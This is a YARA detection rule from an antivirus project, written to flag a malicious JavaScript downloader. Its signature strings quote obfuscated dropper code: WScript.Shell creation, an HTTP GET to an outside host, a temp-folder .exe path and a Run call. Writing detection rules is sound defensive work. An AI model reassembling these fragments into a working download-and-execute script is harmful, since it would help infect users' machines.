rule sig_20160328_7394bd685261a5d8b08dc7fbf91534d7 {
  meta:
    description = "datamaliciousorder - file 20160328_7394bd685261a5d8b08dc7fbf91534d7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1ba37cf943856f86f23abe3ab1be1f98122f1b53c1e67e1b226e891dd0fe28c1"

  strings:
    $s1  = "function Wcksm() {return Apxmnufql[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"kScH9PItk1t2j.exe\";};" fullword ascii
    $s2  = "Onujawd[Niobzbn](\"GET\", \"http://rvstuintafel.com/aqp9ik\", false);" fullword ascii
    $s3  = "do {WScript[Ouvxri](Tzjxmlrx() * 11)} while (Onujawd[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Apxmnufql = function Yojrs() {return WScript[Tngkwdxpk](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Yaxooinnd(Huoxlizyp, Xedvwyca){return Huoxlizyp - Xedvwyca;};" fullword ascii
    $s6  = "function Bgymjnzmgd() {return ((Uhsmrzjg == true) && (Uhsmrzjg == Aesddxoy)) ? 1 : Puvekwrf;};" fullword ascii
    $s7  = "function Oiivsqqf(Qzbztgtfo){Apxmnufql[\"Run\"](Qzbztgtfo, Puvekwrf, Puvekwrf);};" fullword ascii
    $s8  = "function Kxhmgt(Nunjwdo) {var Zvqgp = (1, 2, 3, 4, 5, Nunjwdo); return Zvqgp;};" fullword ascii
    $s9  = "function Fxaxtdwitv(){return Spgwjw;};" fullword ascii
    $s10 = "var Aesddxoy = false;" fullword ascii
    $s11 = "var Hoshfqgtmo = new this[\"Date\"]();" fullword ascii
    $s12 = "var Soxinxy = false;" fullword ascii
    $s13 = "function Jkmgyyd(){return Tngkwdxpk;};" fullword ascii
    $s14 = "var Uhsmrzjg = false;" fullword ascii
    $s15 = " while (Qfdfytucu){" fullword ascii
    $s16 = "Aesddxoy = true; " fullword ascii
    $s17 = "Uhsmrzjg = true; " fullword ascii
    $s18 = "function Kvvywqu()" fullword ascii
    $s19 = "return Yaxooinnd(Qczuml, Jpprvdtre);" fullword ascii
    $s20 = "function Tzjxmlrx(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}